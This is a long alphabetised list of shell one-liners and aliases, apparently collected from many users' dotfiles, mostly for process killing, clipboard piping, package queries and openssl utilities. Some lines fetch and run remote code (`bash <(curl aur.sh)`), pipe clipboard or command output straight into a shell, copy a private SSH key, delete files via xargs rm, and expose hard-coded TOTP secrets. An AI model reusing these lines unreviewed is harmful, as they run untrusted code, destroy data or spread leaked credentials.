ping -i 10 -c 8640 8.8.8.8 | while read pong; do echo “$(date): $pong”; done > dns_pings.txt
ping -c1 8.8.8.8 | awk '/transmitted/ {print \$1}'
ping -c 3 www.google.com |grep -o [0-9]*\\.[0-9]\ ms
ping -c 3 $(ip route list | awk '$0 ~ /default via/ {print $3}')
ping -c 10 www.google.com | grep
ping -c 1 google.fr | tail -3
ping -c 1 google.com | tail -3
ping -c 1 8.8.8.8 | tail -n 2
ping -c 1 8.8.8.8 | md5
ping -c 1 8.8.8.8 | \grep --color=always time=.\*$
ping -c 1 192.168.1.1 | tail -3
ping $(ip-default-route | peco --select-1)
ping $(ip route | awk '/^default via/ { print $3 ; exit }')
ping $(ip ro s default | awk '{print $3}')
ping $(dig google.com A +short | head -n1)
pimpd2 --slove|ls_color
pimpd2 --random-album 10|pimpd2 --add && pimpd2 -play
piknik -paste | xsel -ib
piknik -paste | tar xzpvf -
piknik -paste | tar xzhpvf -
piknik -paste | pbcopy
pikaur -Qi | rg -B3 -A3
pidstat -r |sort -k7r
pidof transmission-daemon | xargs sudo kill -9
pidof tor | xargs sudo kill -HUP
pidof suit | xargs -r kill -SIGINT
pidof spotify | xargs kill
pidof sh4gdb | xargs kill -9
pidof sh4-linux-gdb | xargs kill -9
pidof play | xargs kill -9
pidof play | xargs kill -15
pidof keepalived | kill -s USR1; cat /tmp/keepalived.data
pidof @ | xargs kill -9
pidof $@ | xargs kill -9
picocom -b 115200 /dev/ttyUSB0|tr -cd
pick | tr -d
picgo upload|grep 'http'
pianobar | tee ~/.piano_lines.out
pianobar 2>&1 | grep -v API
phpi | grep -E
phpcs --standard=PSR2 $(git diff --name-only origin/master --diff-filter=ACMRTUXB | grep .php)
phpcbf --standard=PSR2 --no-patch $(git diff --name-only origin/master --diff-filter=ACMRTUXB | grep .php)
php_no_xdebug /usr/local/Cellar/composer/`brew info --json=v1 composer | jq -r '.[0].installed[0].version'`/libexec/composer.phar
php ~/Dropbox/config/scripts/mplayerinfo.php | tail -n 1
php {{symfony2_console_path|default('app/console')}} --env=test
php {{symfony2_console_path|default('app/console')}} --env=prod
php {{symfony2_console_path|default('app/console')}} --env=dev
php artisan route:list | grep $*
php artisan route:list | grep
php artisan list | grep
php app/console |less -R
php app/console twig:debug | grep
php app/console router:debug | grep
php app/console container:debug | grep
php /vagrant/Symfony/app/console doctrine:database:drop --force && php /vagrant/Symfony/app/console doctrine:database:create && php /vagrant/Symfony/app/console doctrine:schema:create && yes | php /vagrant/Symfony/app/console doctrine:fixtures:load
php -i | grep php.ini
php -i | grep
php $(find . -maxdepth 2 -mindepth 1 -name 'console' -type f | head -n 1)
ph; ps aux | grep $USER
pgrp | xargs kill
pgrep zsh | xargs kill -9
pgrep unicorn | xargs kill -USR2
pgrep tmux | xargs kill -9
pgrep test | xargs kill -9
pgrep systemd-inhibit | xargs kill
pgrep stumpwm | xargs kill -9
pgrep sshfs |xargs kill -9
pgrep spring ruby rails rake | xargs kill -9
pgrep qemu | xargs kill -9
pgrep python -u lab | sudo xargs kill
pgrep php-fpm | xargs kill -9
pgrep php | xargs kill -9
pgrep node | xargs kill -9
pgrep node | xargs -n 1 kill
pgrep nginx | xargs sudo kill -9 && sudo /usr/local/sbin/nginx
pgrep nginx | xargs sudo kill -9
pgrep mux\] | xargs kill
pgrep mms | xargs kill
pgrep jupyter | xargs kill -9
pgrep indico | xargs kill -9
pgrep grunt | xargs kill -9
pgrep gpg-agent | xargs -L 1 kill -9 && ___load_gpg_agent && gpg -q < $DOTFILES_DIR/.gnupg/hello.txt.asc
pgrep empathy| xargs kill -9
pgrep cslim | xargs kill -9
pgrep conky | xargs kill
pgrep apache2 | wc -l
pgrep afplay | xargs kill -STOP
pgrep afplay | xargs kill -CONT
pgrep Chrome | xargs kill
pgrep BlueJeans | xargs echo 'process ids: '
pgrep -u tyler -f cassandra | xargs kill -9 && sudo /etc/init.d/cassandra-start-on-boot.sh
pgrep -u tyler -f cassandra | xargs kill -9
pgrep -u leandro -f cassandra | xargs kill -9
pgrep -u `whoami` | xargs kill -9
pgrep -i -f docker | xargs kill
pgrep -f puma | xargs kill -9
pgrep -f jupyter | xargs kill
pgrep -f grails | xargs kill -9
pgrep -f `tty | cut -d/ -f 3-` -l
pgrep -f 'ssh -f' | xargs kill
pgrep -f '\-\-headless' | xargs kill -9
pgrep -f $RUBY_PROCESS_NAMES | xargs kill -9
pgrep -f $NODE_PROCESS_NAMES | xargs kill -9
pgrep %1 | pkill
pgrep $1 | xargs sudo kill
pgj | grep _r_
pgj | grep _m_
pgj | grep YarnChild
pg_x | colorprops
pg_m | colorprops
pg_dumpall | bzip2 -c > ${TARGET_PATH}/postgres/$(date '+%Y-%m-%d-%H-%M-%S').sql.bz2
pg_dump -c -h 3620C -p 5433 -U athenabest amoeba | psql
pfo | pfo_pp
pev | grep -i
pet search | pbcopy
pet list | grep -i
perldoc `perl-module-list | peco`
perldoc -t perllocal | awk '{ if (/Module/) print \$7}'
perldoc $(plenv list-modules | peco)
perlbrew list |grep \@
perlbrew list | grep \@
perl -pe 's|.*(https?:\/\/.*?)\
perl -pe 's/^\?.*$/${Blue}$&${Color_Off}/g' | \
perl -pe 's/^M.*$/${Yellow}$&${Color_Off}/g' | \
perl -pe 's/^C.*$/${Red}$&${Color_Off}/g' | \
perl -pe 's/^A.*$/${IPurple}$&${Color_Off}/g' | \
perl -pe 's/\x1b((\[[0-9;]*[a-zA-Z])|(\([a-zA-Z]))*//g'
perl -pe 's/\t/\n/g' | nl -ba
perl -pe 's/\n//g' | pbcopy
perl -pe 's/.+;//' ~/.zsh_history | awk 'BEGIN {FS=\
perl -pe 's/(\n|\r\n)$//'
perl -pe 'chomp if eof' | xsel --clipboard --input
perl -pe 'chomp if eof' | xclip -selection clipboard
perl -pe 'chomp if eof' | pbcopy
perl -p -i -e 's/^(\S+):(\d+):.*$/\$1 +$2 /g' | xargs sh -c '</dev/tty vim \$*'
perl -p -e 'chomp if eof' | pbcopy
perl -ne'print if /\\b(?<!:)(class|def)\\s/'
perl -e '$|++; while (1) { print
perl -V | grep size=
percol $HOME/file.info | xargs open
percol $HOME/file.info | xargs less
percol $HOME/dir.info | xargs open
per1 -pe 'chomp if eof' | xsel --clipboard --input
pee diffstat colordiff | $PAGER
peco-git-merge-commit-url | xargs $KEU_CHROME_EXECUTABLE
peco | tee >(pbcopy)
peco | c
pdftotext paper_IEEE.pdf - | wc -w
pdftotext -nopgbrk -layout $1 -|less
pcl | xargs git submodule add
pcl | xargs git remote add origin
pcl | xargs git clone
pcat ~/.zsh_history |grep
pcat | less -R
pbp|pbc
pbpaste|wc
pbpaste|say
pbpaste|pbcopy
pbpaste|less
pbpaste|base64 --decode
pbpaste-rtf | textutil -stdin -convert html -stdout
pbpaste-html | pandoc --from=html --to=markdown --reference-links
pbpaste | xmllint -format -
pbpaste | xmllint --format -o ~/`date +%s`.xml -
pbpaste | xmllint --format -
pbpaste | xmlformat
pbpaste | xargs youtube-dl -t --extract-audio --audio-format mp3
pbpaste | xargs rm -f
pbpaste | xargs git clone
pbpaste | xargs get_flash_videos -y -p
pbpaste | wormhole send --text -
pbpaste | wc -w
pbpaste | wc -l
pbpaste | wc
pbpaste | vim -'
pbpaste | vim -
pbpaste | vi -
pbpaste | underscore pretty
pbpaste | tr
pbpaste | tmux load-buffer -
pbpaste | text
pbpaste | ssh htc termux-tts-speak
pbpaste | sqlformat -r -k upper -
pbpaste | snake_case
pbpaste | slackcat -s -c ando
pbpaste | sed -E 's/new\ Date[(]([0-9]*)[)]/\
pbpaste | sed
pbpaste | say --progress -r 190 -v Veena
pbpaste | rtop
pbpaste | qr
pbpaste | python -mjson.tool
pbpaste | python -m json.tool > temp.json && open temp.json && sleep 2 && rm temp.json
pbpaste | python -m json.tool > pbcopy.temp && pbcopy < pbcopy.temp && rm pbcopy.temp
pbpaste | python -m json.tool
pbpaste | python -c \
pbpaste | pprint
pbpaste | pipewrench
pbpaste | piknik -copy
pbpaste | pbcopy
pbpaste | patch -p1
pbpaste | patch
pbpaste | nvim -
pbpaste | nopaste
pbpaste | nkf -w
pbpaste | nc termbin.com 9999
pbpaste | less'
pbpaste | less
pbpaste | kubectl apply -f -
pbpaste | keybase pgp encrypt
pbpaste | keybase pgp decrypt
pbpaste | keybase encrypt
pbpaste | keybase decrypt
pbpaste | json_reformat
pbpaste | json
pbpaste | jq > ~/test.json && open ~/test.json
pbpaste | jq . --sort-keys
pbpaste | jq .
pbpaste | jq
pbpaste | joli -o inspect
pbpaste | gpg --verify
pbpaste | gist -p
pbpaste | gist -c -p
pbpaste | gist --private --open
pbpaste | gist --open
pbpaste | gist
pbpaste | egrep
pbpaste | e -
pbpaste | copy
pbpaste | cat > ~/Desktop/clipboard.txt
pbpaste | cat >
pbpaste | bbedit --clean --view-top
pbpaste | base64 -d
pbpaste | base64 -D
pbpaste | base64 --decode
pbpaste | ansible-vault encrypt_string --vault-password-file=~/ansible-vault/production.key
pbpaste | ansible-vault encrypt_string --vault-password-file=~/ansible-vault/prod-grandmaster.pem
pbpaste | ansible-vault encrypt_string --vault-password-file=~/ansible-vault/development.key
pbpaste | ansible-vault encrypt_string --vault-password-file=~/ansible-vault/brochure-production.key
pbpaste | ansible-vault encrypt_string --vault-password-file=~/ansible-vault/brochure-development.key
pbpaste | ansible-vault encrypt_string --vault-password-file=~/.ssh/production.key
pbpaste | ansible-vault encrypt_string --vault-password-file=~/.ssh/development.key
pbpaste | $HOME/.bin/ep.py
pbpaste |
pbpaste > ~/tmp/current_buffer && nvim ~/tmp/current_buffer && cat ~/tmp/current_buffer | pbcopy
pbpaste > .tmp.json; prettyjson .tmp.json | pbcopy; rm .tmp.json
pbpaste -Prefer txt | pbcopy; pbpaste; echo
pbpaste -Prefer txt | pbcopy
pbpaste - | tshort -e .txt
pbp | pb
pbcopy ~/.ssh/id_rsa.pub | echo '=> Public key copied to pasteboard.'
pbcopy | pbpaste
pbcopy < ~/.ssh/id_rsa.pub | printf '=> Public key copied to pasteboard.\n'
pbcopy < ~/.ssh/id_rsa.pub | pbpaste > ~/clipboard.text
pbcopy < ~/.ssh/id_rsa.pub | echo '=> Public key copied to pasteboard.'
pbcopy < ~/.ssh/id_rsa.pub | echo '=> Public key copied to clipboard.'
pbcopy < ~/.ssh/id_rsa.pub | echo '-- Public key copied to pasteboard! -- '
pbcopy < ~/.ssh/id_rsa | echo '=> Private key copied to clipboard.'
pbcopy < $HOME/.ssh/id_rsa.pub | echo '=> Private key copied to pasteboard.'
pbaspte | patch -p1
pa|grep $1
path|grep -i
path | sort --ignore-case
path | pbcopy
paste|qrencode -t ANSI -m 2
pastebinit|xclip -i
pastebinit | xclip
pastebinit -b paste.debian.net -f bash | xclip
pastebinit -a webeith -b http://pastebin.com -f text | xclip -i
pastebinit -a webeith -b http://pastebin.com -f php | xclip -i
pastebin | xsel -b
pastebin | pbcopy
paste.exe | source /dev/stdin
paste | xclip -sel backup
paste | vim -
paste | clipset
paste <(echo ${(Fk)options}) <(echo ${(F)options}) | sort
paste <(cat /sys/class/thermal/thermal_zone*/type) <(cat /sys/class/thermal/thermal_zone*/temp) | column -s $'\t' -t
paste <(cat /sys/class/thermal/thermal_zone*/type) <(cat /sys/class/thermal/thermal_zone*/temp) <(ls -1 /sys/class/thermal/thermal_zone*/temp) | column -s $'\t' -t
paste -sd+ | bc
paste -sd+ -|bc
paste -sd+ - |bc
paste -sd+ - | bc
paste -s -d+|bc
paste -s -d+ | bc
paste -s -d+ infile | bc
paste -s -d+ - | bc
paste -d'\n' <(sed 'N;N;N;s/\n/ /g' reads_1.fq) <(sed 'N;N;N;s/\n/ /g' reads_2.fq) | tr '\t' '\n' > reads_12.fq
paste $(ls -1art /storage/.kodi/temp/kodi_crashlog* | tail -1)
pass | less -r
pass | grep
pass work/UGent | xargs -n1 sudo vpnstart.exp
pass vcs/github/brentongillis | xclip
pass sna/krb5/mmeffie.admin | kinit mmeffie/admin@SINENOMINE.NET && aklog -c sinenomine.net
pass sna/krb5/mmeffie | kinit mmeffie@SINENOMINE.NET && aklog -c sinenomine.net
pass notes/balena-api-key | xargs sudo balena login -t
pass hrm | sudo -S apt autoclean; sudo apt update; sudo apt upgrade -y; sudo apt autoremove; sudo -k
pass ansible/vault/usegalaxy | ansible-playbook -i stage/inventory pulsar.yml --vault-password-file=/bin/cat
pass ansible/vault/usegalaxy | ansible-playbook -i stage/inventory galaxy_configs.yml --vault-password-file=/bin/cat
pass ansible/vault/usegalaxy | ansible-playbook -i stage/inventory galaxy.yml --vault-password-file=/bin/cat
pass ansible/vault/usegalaxy | ansible-playbook -i production/inventory pulsar.yml --vault-password-file=/bin/cat
pass ansible/vault/usegalaxy | ansible-playbook -i production/inventory galaxy_configs.yml --vault-password-file=/bin/cat
pass ansible/vault/usegalaxy | ansible-playbook -i production/inventory galaxy.yml --vault-password-file=/bin/cat
pass ansible/vault | ansible-playbook --vault=/bin/cat
pass ansible/vault | ansible --vault=/bin/cat
pass ansible/vault | EDITOR=vim ansible-vault edit --vault=/bin/cat
pass Internet/Tile/Password | xargs tile-locate --password
pass Email/fastcloud-vpn| sudo openconnect --config=/home/marco/.config/fastcloud-vpn vpn.fastcloud.it
parseup | xargs -r svn add
parseup | xargs -r rm -rf
parse_git_branch_for_push | xargs -o git push origin HEAD:
parse_git_branch_for_push | xargs -o git push -f origin HEAD:
parse_git_branch | cut -d
parent | pbcopy
parecord -r -d alsa_output.pci-0000_00_1b.0.analog-stereo.monitor --raw --format float32le --rate 48000 | baudline -stdin -channels 2 -format le32f -samplerate 48000 -scaleby 65536
parec --format=s16le --rate=44100 -r -d 1 | ffmpeg -y -ac 2 -f s16le -ar 44100 -i - out.mp3
parallel_rspec_rails_cuke '_spec.rb|.feature'
parallel -j32 --semaphore bash | timeout 3 whereami
parallel -N0 pi $(echo 10^9 | bc) ::: {1..8}
parallel --block 1G --pipe wc -l | awk '{s+=$1} END {print s}'
papertrail -f -d 5 | colortail -g papertrail
pandoc ~/documents/guide.md | pipefox.sh
pandoc README.md | lynx -stdin
pandoc -s -f markdown -t man | man -l -
pandoc -s -f markdown -t man | groff -T utf8 -man
pandoc -f markdown_github - | lynx -stdin
pandoc -f gfm -t plain -s README.md | less
pandoc *.md | lynx -stdin
pandoc $1 | lynx -stdin
pandoc $1 | lynx
pakku -S --needed \$(pakku -Qq | grep \
pages start dev --apps mobile-service | lolcat
paf . | pbcopy
padsp rdesktop -g 1580x932 -d <domain> -u $LOGNAME -p password -a 24 -k en-us -K -r clipboard:CLIPBOARD <host> &|
pactl stat| grep -i Source
pactl set-port-latency-offset $(pacmd list-sinks | egrep -o 'bluez_card[^>]*') headset-output 125000
pactl list sinks | pcregrep -M --only-matching=1 'Sink #(\d)\n.*\n.*\n.*Description: HDA NVidia Digital Stereo \(HDMI\)\n'
pactl list sinks | pcregrep -M --only-matching=1 'Sink #(\d)\n.*Status: RUNNING\n'
pacor | xargs sudo pacman -R --noconfirm
pacmd list-sources|awk '/index:/ {print \$0}; /name:/ {print \$0}; /device\.description/ {print \$0}'
pacmd list-sources | grep -e device.string -e 'name:'
pacmd list-sources | grep -e 'index:' -e device.string -e 'name:'
pacmd list-sinks|awk '/index:/ {print \$0}; /name:/ {print \$0}; /device\.description/ {print \$0}'
pacmd list-sinks | grep -e 'name:' -e 'index:'
pacmd list-sinks | grep -e 'name:' -e 'index'
pacmd list-sinks | grep -e 'name:' -e 'alsa.device ' -e 'alsa.subdevice '
pacmd list-sink-inputs | grep -e 'media.name' -e 'index:'
pacmatic -Q --color always | less
pacman-mirrors | sudo tee /etc/pacman.d/mirrorlist >/dev/null
pacman-color -Qi | awk
pacman-color -Qei | awk '/^Name/ { name=\$3 } /^Groups/ { if ( \$3 != \
pacman -Sup | grep https
pacman -Ss |grep -i
pacman -Ss |grep
pacman -Ss | grep
pacman -Sql testing | xargs pacman-color -Q 2>/dev/null
pacman -Sql testing | xargs pacman -Q 2>/dev/null
pacman -Sp packages | aria2c -i -
pacman -Slq | sort
pacman -Slq | fzf -m --preview
pacman -Slq | fzf --reverse -m --preview
pacman -Slq aur | grep -vxFf <(aur pkglist)
pacman -Sl | cut -d
pacman -Sg | grep blackarch
pacman -Sc; pacman -Qdtq | pacman -Rs -
pacman -Q|wc -l
pacman -Q|less
pacman -Q|grep -i
pacman -Q|grep $1
pacman -Q|grep
pacman -Qu | wc -l
pacman -Qtdq | xargs sudo pacman-color -Rs
pacman -Qtdq | sudo pacman -Rns -
pacman -Qtdq > /dev/null ; sudo pacman -Rns $(pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g') && notify-send 'Done!' 'Done with removing orphan packages.'
pacman -Qtdq > /dev/null && sudo pacman -Rs \$(pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
pacman -Qtdq > /dev/null && sudo pacman -Rns \$(pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
pacman -Qtdq > /dev/null && pacman -Rns \$(pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
pacman -Qss | grep
pacman -Qs | > ~/Dropbox/backup@archlinux/Packages/pkg_all
pacman -Qq|grep
pacman -Qqu | wc -l
pacman -Qqtd | sudo pacman -Rns -
pacman -Qqm | xargs bash <(curl aur.sh) -si --needed
pacman -Qqm | sort
pacman -Qqen | grep
pacman -Qqe | grep -vx \
pacman -Qqe | grep
pacman -Qqe | clz 5
pacman -Qqdt | sudo pacman -Rns -
pacman -Qq | wc -l
pacman -Qq | sort
pacman -Qq | grep -i
pacman -Qo `find .` 2>&1 | grep -v ^error
pacman -Qnq | sudo pacman -S -
pacman -Qn | grep
pacman -Qmq | sort
pacman -Qm | aur vercmp
pacman -Qlq pacman | grep bin
pacman -Qii | awk '/^MODIFIED/ {print \$2}'
pacman -Qii | awk '/^MODIFIED/ {print $2}'
pacman -Qii $@ | awk
pacman -Qi | grep Description
pacman -Qi | gawk
pacman -Qi | awk -F ': *' '{ if (\$1 ~ /Name*/) printf \$2; else if (\$1 ~ /Installed Size/) print \
pacman -Qi | awk '/Nazwa/ { name=\$3 } /Rozmiar po instalacji/ { printf \
pacman -Qi | awk
pacman -Qett --color=always | less
pacman -Qetq | grep
pacman -Qet --color always | $PAGER
pacman -Qenq | pacman -S -
pacman -Qei | awk '/^Name/ { name=$3 } /^Groups/ { if ( $3 !=
pacman -Qei | awk
pacman -Qe | wc -l
pacman -Qe | grep
pacman -Qe | awk '{print \$1}'
pacman -Qe | awk '{print $1}' > package_list.txt && pip list >> package_list.txt
pacman -Qe | awk '{print $1}'
pacman -Qe | awk
pacman -Qdtq | sudo pacman -Rs -
pacman -Qdtq | sudo pacman -Rns -
pacman -Qdtq | sudo pacman -Rcns -
pacman -Q |grep
pacman -Q |g
pacman -Q | wc -l
pacman -Q | less
pacman -Q | grep -i $1
pacman -Q | grep -i
pacman -Q | grep --color=auto
pacman -Q | grep $@
pacman -Q | grep $1
pacman -Q | grep
pacman -Q | column -t > ./$(hostname)_pkglist.nfo
pacman -Q | awk '{print $1}' > package_list.txt
pacman --version | lolcat
pacman --query | grep -i
pacman --query --unrequired | less
paclist | less
package-query -Qf'%3 %n' | sort -rn
pack list | grep --ignore-case
pacgraph -c | less
pacaur -Ss | less
pacaur -Rnsc $(pacaur -Qqdt | tr '\n' ' ')
pacaur -Qq | grep
pacaur -Qm | awk '{print \$1}'
pac -Ss --color=always | fzf -m --ansi
pa | egrep -i
pa aux | grep -i $1
pQ -u | wc -l
p8 | grep -v blank
p5 changes | grep repaln
p4file | cut -d ' ' -f 1
p4 where | awk '{print \$1}'
p4 sync | grep -v updating
p4 opened | awk -F#
p4 changes -u mzhafn -s pending |head -n8
p4 changes $PWD/... | head -n 10
p | tr -d '\n'
p | pbcopy && pwd
p | less
p | grep -i
p | grep
p | g
p | ep
p | egrep -i
p -Q | grep
overview | less
out|xargs awk 'BEGIN{l=1}/Final energy/{if(l%2){printf \
otp | pbcopy && echo `pbpaste`
otfinfo -a /usr/share/fonts/otf/*|less
osmosis listlabels --objectStores=osmosis.dc1.strato:1010 | grep
osc diff | view -
osascript ${APPLESCRIPT_DIR}/nphermes.osa|pbcopy && pbpaste
osascript ${APPLESCRIPT_DIR}/nowplaying.osa|pbcopy && pbpaste
osascript $HOME/development/Applescript/lyrics.scpt | tr \
optica role=kafka-upshot | tail -n 1
opkg list |cut -d ' ' -f 1
opkg list | grep
openstack stack list --property status=IN_PROGRESS --nested -c ID -f value | xargs -t openstack stack cancel --no-rollback
openssl x509 -in certificate.crt -pubkey -noout -outform pem | sha256sum
openssl s_client -connect smtp.gmail.com:587 -starttls smtp | tail -f /var/log/mail.log
openssl rsautl -encrypt -pubin -inkey <(ssh-keygen -f ~/.ssh/id_rsa.pub -e -m PKCS8) -ssl | openssl base64
openssl rsa -outform DER -pubout | openssl sha1 -c
openssl rand 60 | openssl base64 -A
openssl rand 15 | url64
openssl rand -hex 6|sed 's/\(..\)/\1:/g; s/.$//'
openssl rand -hex 6 | sed 's/\\(..\\)/\\1:/g; s/.$//'
openssl rand -hex 6 | sed 's/\(..\)/\1:/g;s/.$//'
openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/./0/2; s/.$//'
openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
openssl rand -hex 6 | sed
openssl rand -base64 8 | pbcopy; pbpaste
openssl rand -base64 48 | sed -e 's/[\/&]/\\&/g'
openssl rand -base64 40 | cut -c1-40
openssl rand -base64 37 | cut -c 1-10
openssl rand -base64 32| head -c
openssl rand -base64 32 | setclip
openssl rand -base64 32 | pbcopy - && echo 'The generated password is in your clipboard'
openssl rand -base64 32 | pbcopy
openssl rand -base64 32 | head -c 32
openssl rand -base64 27 | cut -c1-27
openssl rand -base64 25 | tr -d /
openssl rand -base64 20 | pbcopy && echo 'Random password copied to clipboard'
openssl rand -base64 20 | cut -d '=' -f 1
openssl rand -base64 20 | cut -c1-20
openssl rand -base64 16 | pbcopy; echo 'Password copied to clipboard!'
openssl rand -base64 16 | colrm 17
openssl rand -base64 15 | tr -d '0OIl+/'
openssl rand -base64 14 | pbcopy
openssl pkey -in privateKey.key -pubout -outform pem | sha256sum
openssl pkcs8 -in ~/.ssh/richard2.pem -nocrypt -topk8 -outform DER | openssl sha1 -c
openssl md5 | head -c 32
openssl enc -d -aes-256-cbc -a -salt | gunzip
openssl enc -d -${CIPHER} -a | gunzip -
openssl dgst -sha384 -binary | openssl enc -base64 -A
openssl dgst -binary -sha256 | openssl base64
openssl base64 | tr -d '\n'
openssl base64 -d | openssl rsautl -decrypt -inkey ~/.ssh/id_rsa
openssl aes-256-cbc -d -in ~/Dropbox/Todo/mullid | pbcopy
open https://glgroup.zoom.us/my/mmart && echo https://glgroup.zoom.us/my/mmart | pbcopy
open https://glgroup.zoom.us/my/bhudgens && echo https://glgroup.zoom.us/my/bhudgens | pbcopy
open https://github.`(git config remote.origin.url | cut -f2 -d.)`
open https://github.$(git config remote.origin.url | cut -f2 -d.)
open `ls -tr | tail -1`
open `ls *.pdf | head -n1`
open `hub browse -u | sed s/\tree.*//g`/compare/`git rev-parse --abbrev-ref HEAD`
open `gem which rcov | sed -e 's/lib.*$//'`
open \`git config --get remote.origin.url | sed -E 's/^.*github\.com[:\/](.*)\.git$/https:\/\/github.com\/\1/'\`
open /Applications/Google\ Chrome.app https://www.drupal.org/node/\$(git symbolic-ref -q HEAD 2>/dev/null | sed 's/^refs\/heads\/\([0-9]*\).*/\1/')
open -n $(ls *.asta | peco)
open -b com.jetbrains.webstorm $(ghq root)/$(ghq list | peco)
open -b com.jetbrains.pycharm $(ghq root)/$(ghq list | peco)
open -b com.jetbrains.phpstorm $(ghq root)/$(ghq list | peco)
open -b com.jetbrains.intellij $(ghq root)/$(ghq list | peco)
open -b com.jetbrains.goland $(ghq root)/$(ghq list | peco)
open -b com.jetbrains.clion $(ghq root)/$(ghq list | peco)
open -a '/Applications/Google Chrome.app' $(git config --get remote.origin.url | sed 's/.git$//g')
open $(tag -f fav | peco)
open $(git remote get-url origin | sed -Ee
open $(git config remote.origin.url | sed
open $(ghq root)/$(ghq list | fzf)
open $(find ~/Library/Developer/CoreSimulator/Devices/$(ls -t1 ~/Library/Developer/CoreSimulator/Devices/ | head -1)/data/Containers/Data/Application/ -name \*.realm)
open $(find ~/Library/Developer/CoreSimulator/Devices/$(ls -t1 ~/Library/Developer/CoreSimulator/Devices/ | head -1)/data/Containers/Data/Application -name \*.realm)
oofpasta | owo
oof | owo
onlyloclines | fileline
only_files | xargs mine
one=$(upower -i $(upower -e | grep
omz_history -f | less
omz_history -f | grep
okta-aws; okta-aws chegg-aws-shared-nonprod ecr get-login --no-include-email |bash
oe && cat src/ExtendHealth.OneExchange/Web.config | grep 'connectionstring' -i
od -An -tx1 | tr -d \
od -An -N2 -i /dev/urandom | xargs
od -A n -t x1 |sed 's/ /\\\\x/g'
od --width=24 -X -A n /dev/urandom | head -1
oci compute image list | jq
oc get pod|grep Running
oc get pods | grep Running
obxprop | rg ^_OB_APP_
obxprop | grep \
oblique | pokesay
objdump -p ./a.out | grep NEEDED
objdump -D bin/kernel.elf | less
objdump -D /ant | less
oathtool --totp -b e52kmcqri6fuglqbj24npf3s2ef2k4lv | xsel -ib
oathtool --totp -b RWAUV33LPY2CWPJ3P4ENGVTMSFTPQQET | pbcopy
oathtool --totp -b RKPCI2ILU57R4IBC| xclip
oathtool --totp --base32 $mfa | pbcopy; echo 'success! : copied MFA code to clipboard'
oarstat | grep akrishna
nvr -c tabe\\|terminal
nvm use $(cat package.json | jq -r .engines.node)
nvm ls-remote | tail -n 1
nvm ls-remote | tail -4
nvm ls-remote | tail
nvm ls-remote --lts | grep Latest
nvm install \$(cat .nvmrc) --reinstall-packages-from=\$(node -v | tr -d v)
nvim' | cat - $scriptf > __tmp && mv __tmp $scriptf
nvim `ls -t | head -1`
nvim `git status --porcelain | sed -ne
nvim `git ls-files | peco`
nvim \`git status --porcelain | sed -ne 's/^ M //p'\`
nvim \$(gst -s | awk '{print \$2}')
nvim \$(git status --porcelain | awk '{ if (\$1 == \
nvim -c 'h vim_diff.txt|only'
nvim -c 'h help.txt|only'
nvim --noplugin' | cat - $scriptf > __tmp && mv __tmp $scriptf
nvim --cmd 'set termguicolors|hi normal guifg=#ff0000'
nvim $(ls | fzf)
nvim $(git status --porcelain | cut -s -f 2 -d M)
nvim $(git diff --cached --name-only | peco)
nvim $(git -C ~/dotfiles ls-files | fzf --height=40% --reverse --ansi --exact --color=16)
nvim $(find ~/Workspace -type f | percol)
nvim $(find . | fzf)
nvim $(fd . --hidden | fzf)
num_jobs | xargs python /lustre/scratch/inf/thk22/code/cowsay-py/cowsay.py
ns_who -ghst | grep
ns | grep
nroff -man \!* | more -s
nroff -man $* | $PAGER
npx uuid v1 | pbcopy && pbpaste
npm uninstall `ls -1 node_modules | tr '/\n' ' '`; npm prune
npm uninstall `ls -1 node_modules | tr
npm start | tee /tmp/cat_npm.log
npm start | bunyan
npm start servers | pm2 logs
npm run --silent test 2>&1 | tee -a test.log
npm run --silent coverage 2>&1 | tee -a test.log
npm run $(commands | peco)
npm outdated && bower list | grep latest
npm ls | grep repo
npm ls | grep -v
npm ls -gp --depth=0 | grep
npm ls -g --depth=0 && ncu -g && for package in \$(npm -g outdated --parseable --depth=0 | cut -d: -f4); do npm i \${package} -g; done
npm ls --depth 0 2>&1 | cc -P ~/s/konrad/cc/npm.noon
npm ls --depth 0 -g 2>&1 | cc -P ~/s/konrad/cc/npm.noon
npm list | sed -ne 's/^[├└][^ ]* //p'
npm list -g | sed -ne 's/^[├└][^ ]* //p'
npm list -g | grep '^├'
npm list -g | grep $1
npm list -g | grep
npm list -g --depth=0 | lolcat
npm list -g --color=always |& less -S
npm list -depth 0 -g | \grep @
npm list --global --depth 0 | less
npm list --depth 0 | less
npm init -y && tsc --init && touch \$(cat package.json|jq -r '.main')
npm cache clear && bower cache clean && rm -rf node_modules bower_components && npm install && bower install | echo ༼ ºل͟º༼ ºل͟º( ͡° ͜ʖ ͡°)ºل͟º ༽ºل͟º ༽
npm audit | grep Moderate -B1 -A10
npm audit | grep High -B1 -A10
npm audit | grep Critical -B1 -A10
np | grep
nowdir=$(pwd);cd /mnt/TW_db-bin/report; lastrpt=$(/bin/ls -1 *.twr | /usr/bin/tail -1); sudo tripwire -m u -a -c /mnt/TW_db-bin/tw.cfg -p /mnt/TW_db-bin/tw.pol -S /mnt/TW_db-bin/site.key -L /mnt/TW_db-bin/${HOSTNAME}-local.key -d /mnt/TW_db-bin/${HOSTNAME}.twd -r ${lastrpt}; cd $nowdir
now rm $(now-no-alias | json -a uid)
now && now alias && now rm --safe --yes `cat now.json | npx json name`
nova list | grep
notmuch search folder:hdm/INBOX tag:unread | cut -f 3- -d ' '
notes | grep -i
note | grep
nosetests -v 2> somefile; less somefile | fpp; sudo rm somefile
nosetests --match='(?:^|[\b_\./-])mptest' --with-yanc
norminette | grep -b1 Error
norminette **/*.c **/*.h | grep -v Norme -B1
norminette **/*.[ch] | grep Error -B 1
norminette **/*.[ch] | grep -v 'Norme' -B1
nonmaster-branches | xargs -I {} git branch -d {}
noglob tail -f $HOME/Library/Logs/iOS\ Simulator/$(cut -d/ -f7 <<< $(ps ax|grep
noglob git checkout `git branch | peco`
noflash|sed
noeol | pbcopy
nodeversion=$(cat package.json | jq -r .engines.node); nvm install $nodeversion
nodeunit test/*.test.js 2>&1 | bunyan
nodemon | bunyan -o short
nodemon index.js | pino-pretty
nodemon index.js | bunyan -l 0
nodemon -x 'node . | ./node_modules/.bin/bunyan'
node_modules/.bin/flow status --color=always | less -R +G
node server.js | ./node_modules/bunyan/bin/bunyan
